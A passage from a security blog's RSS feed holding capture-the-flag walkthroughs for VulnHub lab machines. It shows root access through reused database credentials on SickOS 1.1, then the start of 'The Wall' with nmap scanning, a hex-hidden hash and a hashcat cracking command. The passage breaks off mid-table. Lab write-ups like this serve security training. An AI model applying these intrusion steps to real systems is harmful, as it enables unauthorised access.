&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;// Database settings:
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_DSN'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'mysql:dbname=wolf;host=localhost;port=3306'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASS'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'john@123'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'TABLE_PREFIX'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h2&gt;

&lt;p&gt;The previously discovered credentials worked for MySQL root, and were reused for the user &lt;code&gt;sickos&lt;/code&gt; and again for &lt;code&gt;sudo&lt;/code&gt; as the user &lt;code&gt;sickos&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Local Privilege Escalation:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@SickOs:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su - sickos
su - sickos
Password: john@123

sickos@SickOs:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;sickos@SickOs:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bash_history
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .bash_history
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;su
&lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;sickos@SickOs:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;sickos: john@123

root@SickOs:~# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root  
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@SickOs:/root# &lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;a0216ea4d51874464078c618298b1367.txt
root@SickOs:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;a0216ea4d51874464078c618298b1367.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Trying


root@SickOs:/root#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/sickos/root-flag.png&quot; alt=&quot;Sickos 1.1 Root Flag&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>The Wall Boot2Root Walkthrough</title>
          <link>https://highon.coffee/blog/the-wall-walkthrough/</link>
          <pubDate>Wed, 02 Dec 2015 00:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/the-wall-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port Scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#http-enumeration&quot; id=&quot;markdown-toc-http-enumeration&quot;&gt;HTTP Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#hash-cracking&quot; id=&quot;markdown-toc-hash-cracking&quot;&gt;Hash Cracking&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#md5-hashcat&quot; id=&quot;markdown-toc-md5-hashcat&quot;&gt;MD5 Hashcat&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#steghide&quot; id=&quot;markdown-toc-steghide&quot;&gt;Steghide&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sftp-login&quot; id=&quot;markdown-toc-sftp-login&quot;&gt;SFTP Login&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#fatcat-fat16-forensics-tool&quot; id=&quot;markdown-toc-fatcat-fat16-forensics-tool&quot;&gt;Fatcat FAT16 Forensics Tool&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ssh-shell&quot; id=&quot;markdown-toc-ssh-shell&quot;&gt;SSH Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-system-enumeration&quot; id=&quot;markdown-toc-local-system-enumeration&quot;&gt;Local System Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#account-rogerwaters&quot; id=&quot;markdown-toc-account-rogerwaters&quot;&gt;Account: RogerWaters&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#account-nickmason&quot; id=&quot;markdown-toc-account-nickmason&quot;&gt;Account: NickMason&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#extracting-morse-code-data&quot; id=&quot;markdown-toc-extracting-morse-code-data&quot;&gt;Extracting Morse Code Data&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#morse-code-decoded&quot; id=&quot;markdown-toc-morse-code-decoded&quot;&gt;Morse Code Decoded&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#discovered-credentials&quot; id=&quot;markdown-toc-discovered-credentials&quot;&gt;Discovered Credentials&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#account-richardwright&quot; id=&quot;markdown-toc-account-richardwright&quot;&gt;Account: RichardWright&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#path-manipulation&quot; id=&quot;markdown-toc-path-manipulation&quot;&gt;PATH Manipulation&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#account-davidgilmour&quot; id=&quot;markdown-toc-account-davidgilmour&quot;&gt;Account: DavidGilmour&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-enumeration&quot; id=&quot;markdown-toc-web-application-enumeration&quot;&gt;Web Application Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root-shell&quot; id=&quot;markdown-toc-root-shell&quot;&gt;Root Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root-flag&quot; id=&quot;markdown-toc-root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;In 1965, one of the most influential bands of our times was formed.. Pink
Floyd. This boot2root box has been created to celebrate 50 years of Pink
Floyd’s contribution to the music industry, with each challenge giving the
attacker an introduction to each member of the Floyd.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; &lt;a href=&quot;https://twitter.com/xerubus&quot;&gt;@xerubus&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;An initial Nmap scan yielded no results.&lt;/p&gt;

&lt;p&gt;WireShark was used to expose an ARP broadcast for &lt;code&gt;TCP: 1337&lt;/code&gt;, a netcat listener was setup on port 1337.&lt;/p&gt;

&lt;p&gt;The target machine connected with the following message:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;netcat &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;

                      .u!&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
                  .x&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
              ..+&lt;span class=&quot;s2&quot;&gt;&quot;NP
           .z&quot;&quot;   ?
         M#&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;      9     ,     ,
                  9 M  d! ,8P&lt;span class=&quot;s1&quot;&gt;'
                  R X.:x'&lt;/span&gt; R&lt;span class=&quot;s1&quot;&gt;'  ,
                  F F'&lt;/span&gt; M  R.d&lt;span class=&quot;s1&quot;&gt;'
                  d P  @  E`  ,
     ss           P  '&lt;/span&gt;  P  N.d&lt;span class=&quot;s1&quot;&gt;'
      x         ''        '&lt;/span&gt;
      X               x             &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
      9     .f       &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;         &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;
      4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;nv&quot;&gt;$k&lt;/span&gt;      /         dH    &lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;
     &lt;span class=&quot;s1&quot;&gt;'X   ;$$     z  .       MR   :$
       R   M$$,   :  d9b      M'&lt;/span&gt;   tM
       M:  &lt;span class=&quot;c&quot;&gt;#'$L  ;' M `8      X    MR&lt;/span&gt;
       &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;t' &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  # X ,oR      t    Q;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@  R&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;H :RP' &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;     X    @'
        9&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$E&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  @Bd' &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;   ?X     ;    W
        &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;M&lt;span class=&quot;s1&quot;&gt;'  `$M d$    `E    ;.o* :R   ..
         `    '&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;'     '    @'   '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'

             The Wall by @xerubus
         -= Welcome to the Machine =-

If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don'&lt;/span&gt;t be surprised when a crack &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the ice appears under your feet. - Pink Floyd, The Thin Ice&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;After the machine successfully connected to the netcat listener the following
services were discovered with Nmap.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# nmap -sV -p 1-65535 -A -v 192.168.221.129&lt;/span&gt;

Starting Nmap 7.00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2015-11-30 06:29 EST
NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:29
Completed NSE at 06:29, 0.00s elapsed
Initiating NSE at 06:29
Completed NSE at 06:29, 0.00s elapsed
Initiating ARP Ping Scan at 06:29
Scanning 192.168.221.129 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 06:29, 0.07s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Parallel DNS resolution of 1 host. at 06:29
Completed Parallel DNS resolution of 1 host. at 06:29, 0.00s elapsed
Initiating SYN Stealth Scan at 06:29
Scanning 192.168.221.129 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 80/tcp on 192.168.221.129
SYN Stealth Scan Timing: About 20.45% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 06:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:02:01 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 48.81% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 06:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:01:04 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Discovered open port 1965/tcp on 192.168.221.129
Completed SYN Stealth Scan at 06:30, 104.59s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 06:30
Scanning 2 services on 192.168.221.129
Completed Service scan at 06:32, 96.15s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 192.168.221.129&lt;/span&gt;
NSE: Script scanning 192.168.221.129.
Initiating NSE at 06:32
Completed NSE at 06:32, 7.22s elapsed
Initiating NSE at 06:32
Completed NSE at 06:32, 0.00s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.221.129
Host is up, received arp-response &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00027s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 OpenBSD httpd
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
1965/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.0 (protocol 2.0)
| ssh-hostkey:
|   2048 70:26:15:de:7b:29:9a:56:a3:eb:33:e0:7e:fb:92:d8 (RSA)
|_  256 6c:2b:d1:2c:4f:1c:b5:7a:1b:1e:e9:4b:8e:9b:4b:5a (ECDSA)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.00%I=7%D=11/30%Time=565C336F%P=x86_64-pc-linux-gnu%r(Get
SF:Request,2D9,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nContent-
SF:Length:\x20539\r\nContent-Type:\x20text/html\r\nDate:\x20Sun,\x2029\x20
SF:Nov\x202015\x2022:51:15\x20GMT\r\nLast-Modified:\x20Sat,\x2024\x20Oct\x
SF:202015\x2015:20:23\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\n\r\n&amp;lt;html&amp;gt;\
SF:n&amp;lt;body\x20bgcolor=\&quot;#000000\&quot;&amp;gt;\n&amp;lt;center&amp;gt;&amp;lt;img\x20src=\&quot;pink_floyd\.jpg\&quot;
SF:&amp;lt;/img&amp;gt;&amp;lt;/center&amp;gt;\n&amp;lt;/body&amp;gt;\n&amp;lt;/html&amp;gt;\n\n\n&amp;lt;!--If\x20you\x20want\x20to\x20f
SF:ind\x20out\x20what'&lt;/span&gt;s&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20behind&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20these&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20cold&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20eyes,&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20you&lt;span class=&quot;s1&quot;&gt;'ll\x20j
SF:ust\x20have\x20to\x20claw\x20your\x20way\x20through\x20this\x20disguise
SF:\.\x20-\x20Pink\x20Floyd,\x20The\x20Wall\n\nDid\x20you\x20know\?\x20The
SF:\x20Publius\x20Enigma\x20is\x20a\x20mystery\x20surrounding\x20the\x20Di
SF:vision\x20Bell\x20album\.\x20\x20Publius\x20promised\x20an\x20unspecifi
SF:ed\x20reward\x20for\x20solving\x20the\x20\nriddle,\x20and\x20further\x2
SF:0claimed\x20that\x20there\x20was\x20an\x20enigma\x20hidden\x20within\x2
SF:0the\x20artwork\.\n\n737465673d3333313135373330646262623337306663626539
SF:373230666536333265633035--&amp;gt;\n\n&quot;)%r(HTTPOptions,218,&quot;HTTP/1\.0\x20405\x
SF:20Method\x20Not\x20Allowed\r\nDate:\x20Sun,\x2029\x20Nov\x202015\x2022:
SF:51:15\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html\r\nContent-Length:\x20376\r\n\r\n&amp;lt;!DOCTYPE\x
SF:20html&amp;gt;\n&amp;lt;html&amp;gt;\n&amp;lt;head&amp;gt;\n&amp;lt;title&amp;gt;405\x20Method\x20Not\x20Allowed&amp;lt;/title&amp;gt;
SF:\n&amp;lt;style\x20type=\&quot;text/css\&quot;&amp;gt;&amp;lt;!--\nbody\x20{\x20background-color:\x20w
SF:hite;\x20color:\x20black;\x20font-family:\x20'&lt;/span&gt;Comic&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Sans&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20MS&lt;span class=&quot;s1&quot;&gt;',\x20
SF:'&lt;/span&gt;Chalkboard&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20SE&lt;span class=&quot;s1&quot;&gt;',\x20'&lt;/span&gt;Comic&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Neue&lt;span class=&quot;s1&quot;&gt;',\x20sans-serif;\x20}\nhr\x20{\x2
SF:0border:\x200;\x20border-bottom:\x201px\x20dashed;\x20}\n\n--&amp;gt;&amp;lt;/style&amp;gt;\
SF:n&amp;lt;/head&amp;gt;\n&amp;lt;body&amp;gt;\n&amp;lt;h1&amp;gt;405\x20Method\x20Not\x20Allowed&amp;lt;/h1&amp;gt;\n&amp;lt;hr&amp;gt;\n&amp;lt;addr
SF:ess&amp;gt;OpenBSD\x20httpd&amp;lt;/address&amp;gt;\n&amp;lt;/body&amp;gt;\n&amp;lt;/html&amp;gt;\n&quot;)%r(RTSPRequest,218,
SF:&quot;HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Sun,\x2029\x2
SF:0Nov\x202015\x2022:51:15\x20GMT\r\nServer:\x20OpenBSD\x20httpd\r\nConne
SF:ction:\x20close\r\nContent-Type:\x20text/html\r\nContent-Length:\x20376
SF:\r\n\r\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html&amp;gt;\n&amp;lt;head&amp;gt;\n&amp;lt;title&amp;gt;405\x20Method\x20Not
SF:\x20Allowed&amp;lt;/title&amp;gt;\n&amp;lt;style\x20type=\&quot;text/css\&quot;&amp;gt;&amp;lt;!--\nbody\x20{\x20bac
SF:kground-color:\x20white;\x20color:\x20black;\x20font-family:\x20'&lt;/span&gt;Comic&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
SF:x20Sans&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20MS&lt;span class=&quot;s1&quot;&gt;',\x20'&lt;/span&gt;Chalkboard&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20SE&lt;span class=&quot;s1&quot;&gt;',\x20'&lt;/span&gt;Comic&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20Neue&lt;span class=&quot;s1&quot;&gt;',\x20sans-seri
SF:f;\x20}\nhr\x20{\x20border:\x200;\x20border-bottom:\x201px\x20dashed;\x
SF:20}\n\n--&amp;gt;&amp;lt;/style&amp;gt;\n&amp;lt;/head&amp;gt;\n&amp;lt;body&amp;gt;\n&amp;lt;h1&amp;gt;405\x20Method\x20Not\x20Allowe
SF:d&amp;lt;/h1&amp;gt;\n&amp;lt;hr&amp;gt;\n&amp;lt;address&amp;gt;OpenBSD\x20httpd&amp;lt;/address&amp;gt;\n&amp;lt;/body&amp;gt;\n&amp;lt;/html&amp;gt;\n&quot;);
MAC Address: 00:0C:29:31:3C:84 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 5.X
OS CPE: cpe:/o:openbsd:openbsd:5
OS details: OpenBSD 5.0 - 5.4
Uptime guess: 0.000 days (since Mon Nov 30 06:32:25 2015)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Randomized

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 192.168.221.129

NSE: Script Post-scanning.
Initiating NSE at 06:32
Completed NSE at 06:32, 0.00s elapsed
Initiating NSE at 06:32
Completed NSE at 06:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.78 seconds
           Raw packets sent: 131193 (5.775MB) | Rcvd: 91 (4.108KB)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenBSD httpd&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 1965&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 7.0 (protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;

&lt;p&gt;Interrogation of the page source revealed a code comment with an &lt;strong&gt;ASCII&lt;/strong&gt; encoded string:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Decoding revealed the MD5 hash:&lt;code&gt;steg=33115730dbbb370fcbe9720fe632ec05&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;hash-cracking&quot;&gt;Hash Cracking&lt;/h2&gt;

&lt;h3 id=&quot;md5-hashcat&quot;&gt;MD5 Hashcat&lt;/h3&gt;

&lt;p&gt;The discovered hash was cracked with &lt;strong&gt;Hashcat&lt;/strong&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 thewall.txt /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Hash&lt;/th&gt;
      &lt;th&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;33115730dbbb370fcbe9720fe632ec05&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
